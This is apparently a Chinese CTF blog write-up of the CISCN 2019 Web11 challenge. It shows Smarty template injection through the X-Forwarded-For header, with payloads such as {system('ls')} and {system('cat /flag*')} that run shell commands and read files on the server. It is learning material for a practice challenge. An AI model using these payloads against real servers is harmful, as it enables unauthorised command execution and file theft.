---
title: CISCN 2019华东南Web11
date: 2022-05-14 22:10:34
toc: false
tags:
- SSTI
categories: CTF-Web
my: CISCN2019_Web11
---

拿到题目  我只看见满屏的IP  

![](https://s2.loli.net/2022/05/14/A6CEuG9DUd2KMXk.png)

第一时间想到这道题与IP有关系 打开我们的hackbar尝试修改X-Forwarded-For的值  发现右上角有了变化

![](https://s2.loli.net/2022/05/14/8tKpH5VEjrN6AlB.png)

![](https://s2.loli.net/2022/05/14/SQUjBWb8qmTc4vN.png)

尝试获取根目录下文件

```
{system('ls')}
```



右上角出现回显

![](https://s2.loli.net/2022/05/14/ub1EKCRpGHVN9fi.png)

为了方便我们burp抓一下包  直接定位到我们需要的位置

![](https://s2.loli.net/2022/05/14/xb2dZCHcheVUKzS.png)

尝试各种读取  发现都没有flag

- X-Forwarded-For:{system(‘cat /api’)}
- X-Forwarded-For:{system(‘cat /css’)}
- X-Forwarded-For:{system(‘cat /index.php’)}
- X-Forwarded-For:{system(‘cat /smarty’)}
- X-Forwarded-For:{system(‘cat /templates_c’)}
- X-Forwarded-For:{system(‘cat /xff’)}

于是根据做题经验，我们盲猜！flag在根目录  很快就找到了flag

```
{system('cat ../../../flag')}或者{system('cat /flag*')}
```

![](https://s2.loli.net/2022/05/14/irAJaCpnRwWljFm.png)

第二种解法偶尔会出现牛鬼蛇神fl0g就找不到 建议还是老老实实去根目录找

![](https://s2.loli.net/2022/05/14/4udCAWSvlmBospQ.png)
